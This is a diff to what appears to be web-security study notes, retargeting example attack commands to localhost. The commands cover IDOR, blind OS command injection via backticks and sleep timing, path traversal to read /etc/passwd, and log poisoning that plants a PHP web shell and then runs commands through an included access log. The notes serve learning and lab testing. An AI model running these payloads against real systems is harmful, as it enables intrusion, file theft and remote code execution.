@@ -60,7 +60,7 @@
 
 ```bash
 # IDOR
-curl https://example.org/profile/200
+curl https://localhost:8000/profile/200
 ```
 
 ```txt
@@ -118,10 +118,14 @@ public function profile(): Response{
 
 ### Blind
 
+- https://www.gnu.org/software/bash/manual/html_node/Quoting.html
 - https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities
 
 ```
-curl http://example.org/files/file.php -d "arg='x[$([ -f /etc/passwd ] && sleep 3)]'"
+# --form-string avoid interpreting @ and < => for raw binaries
+curl http://localhost:8000/index.php -d 'arg=`curl -m1 http://localhost:8000/RCE`'
+
+curl http://localhost:8000/index.php --form-string 'arg=`[[ -f /etc/passwd ]] && sleep 3`'
 ```
 
 
@@ -135,8 +139,8 @@ curl http://example.org/files/file.php -d "arg='x[$([ -f /etc/passwd ] && sleep 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
 
 ```bash
-curl http://example.org/files/upload/../../../../etc/passwd --path-as-is
-curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
+curl http://localhost:8000/files/upload/../../../../etc/passwd --path-as-is
+curl -X POST "http://localhost:8000/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
 ```
 
 `Protection`:
@@ -175,8 +179,8 @@ et `.htaccess`
 - https://web.archive.org/web/20120818120202/http://www.ghostsinthestack.org/article-26-bypasser-les-htaccess-avec-limit.html
 
 ```bash
-curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
-curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+curl http://localhost:8000/ -A "<?php system(\$_GET['cmd']);?>"
+curl http://localhost:8000/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
 ### XXE
